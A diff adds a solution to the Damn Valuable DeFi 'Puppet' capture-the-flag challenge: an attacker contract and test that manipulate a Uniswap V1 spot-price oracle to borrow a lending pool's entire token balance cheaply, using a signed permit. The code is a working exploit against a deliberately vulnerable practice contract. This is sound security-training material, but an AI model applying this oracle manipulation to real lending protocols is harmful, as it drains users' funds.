@@ -8,6 +8,77 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+
+
+contract PuppetPoolAttacker {
+    DamnValuableToken public immutable token;
+    PuppetPool public immutable lendingPool;
+    IUniswapV1Exchange public immutable uniswapV1Exchange;
+    address public immutable recovery;
+
+    constructor(
+        address _token,
+        address _lendingPool,
+        address _uniswapV1Exchange,
+        address _recovery
+    ) {
+        token = DamnValuableToken(_token);
+        lendingPool = PuppetPool(_lendingPool);
+        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
+        recovery = _recovery;
+    }
+
+    function attack(
+        address player,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external payable {
+        
+        token.permit(
+            player,
+            address(this),
+            type(uint256).max,
+            deadline,
+            v,
+            r,
+            s
+        );
+
+        require(msg.value == 25 ether, "NO ETH RECEIVED");
+
+        
+        uint256 playerTokens = token.balanceOf(player);
+        token.transferFrom(player, address(this), playerTokens);
+
+        
+        uint256 attackerTokens = token.balanceOf(address(this));
+        token.approve(address(uniswapV1Exchange), attackerTokens);
+
+        uniswapV1Exchange.tokenToEthTransferInput(
+            attackerTokens,
+            9,
+            block.timestamp + 1,
+            address(this)
+        );
+
+        
+        uint256 poolTokens = token.balanceOf(address(lendingPool));
+
+        lendingPool.borrow{ value: 20 ether }(
+            poolTokens,
+            recovery
+        );
+    }
+
+    receive() external payable {}
+}
+
+
+
+
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +163,51 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+
+        //attacker contract is above this test contract
+        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
+        address(token),
+        address(lendingPool),
+        address(uniswapV1Exchange),
+        recovery
+        );
+
+    
+        // Prepare EIP-2612 permit
+        uint256 deadline = block.timestamp + 1 days;
+        uint256 value    = type(uint256).max;
+        uint256 nonce    = token.nonces(player);
+
+        bytes32 PERMIT_TYPEHASH = keccak256(
+            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
+        );
+
+        bytes32 structHash = keccak256(
+            abi.encode(
+                PERMIT_TYPEHASH,
+                player,
+                address(attacker),
+                value,
+                nonce,
+                deadline
+            )
+        );
+
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                token.DOMAIN_SEPARATOR(),
+                structHash
+            )
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+
+        // 1 tx restriction
+        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
+
+        //this is why the exploit works: the pool 'calculateDepositRequired()' can be manipulated by selling a lot of tokens in the pool
+        //and we know 'player''s private key and use it in 'permit' to get player's tokens
     }
 
     // Utility function to calculate Uniswap prices
@@ -116,3 +231,5 @@ contract PuppetChallenge is Test {
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+
